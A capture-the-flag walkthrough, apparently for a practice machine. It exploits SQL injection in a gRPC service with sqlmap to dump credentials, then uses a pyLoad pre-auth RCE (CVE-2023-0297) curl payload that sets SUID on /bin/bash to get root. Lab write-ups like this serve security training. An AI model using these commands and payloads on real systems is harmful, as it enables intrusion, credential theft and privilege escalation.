Box Summary
To get the access to the server to exploit SQL injection on gRPC and get user flag. 
To get root flag we exploit RCE on pyLoad.


1. ping the machine to test the connectivity
# ping 10.10.11.214

2. Scanning for all open ports
# sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ping 10.10.11.214
# nmap -p22,50051 -sCV -Pn 10.10.11.214
Trying to google 'what is default service for port  50051' and find out gRPC

gRPC(Google Remote Procedure Call)


3. Installing gRPC to access the port 
# git clone https://github.com/fullstorydev/grpcui 
# go install github.com/fullstorydev/grpcui/cmd/grpcui@latest - before running this command make sure
you have golang installed in your computer
# cd grpcui
# make install
# cd /home/user/go/bin
# ./grpcui -plaintext 10.10.11.214:50051

4. Testing the interface
a. Testing getinfo form by putting any id - "message": "Authorization Error.Missing 'token' header"
b. Try to register and login as in most API user get token
c. test getinfo by using token
c. Trying to use burpsuite
Login, try to set id 1, intercept the request, save to the file and use sqlmap
------> Resultd <--------

It shows the backend database is SQLIte
# sqlmap -r pc -p id
# sqlmap -r pc -p id --dbs
# sqlmap -r pc -p id --tables  
# sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns
# sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump

After that we get username and password, let's try to SSH by using both users.
user sau can ssh and get user flag.

5. Getting root flag
# sudo -l => Check if user sau can run any command as root
# ps aux => Check running process
# netstat -nat => Check open ports
Let's try 8000 SSH port fowarding
# ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
After that go on your browser 127.0.0.1:8000
The interface shows pyLoad
Try googling this "pyLoad exploit poc", you may see it is vulnerable to remote code excution

Exploit reference link : https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

# curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68 \");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'

# /bin/bash -p 

